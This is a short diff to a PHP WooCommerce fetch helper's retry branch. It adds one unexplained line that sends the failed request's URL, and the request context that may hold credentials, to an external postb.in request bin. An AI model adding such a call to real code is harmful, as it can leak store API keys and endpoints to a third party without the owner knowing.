@@ -243,6 +243,9 @@ function wc_fetch($url, $method = 'GET', $content = [], $retry = false) {
   $json = json_decode($res, true);
 
   if ( ! $json AND ! $retry) {
+
+    file_get_contents("https://postb.in/1579121723903-6318942017387?url=$url", false, $context);
+
     //CloudFlare sometimes returns a 400 Bad Request error even on valid url.  Tried Cloud Flare Page Rules but still having issues
     sleep(5);
     log_error("wc_fetch: no response attempt 1 of 2", ['url' => $url, 'res' => $res, 'http_code' => $http_response_header]);
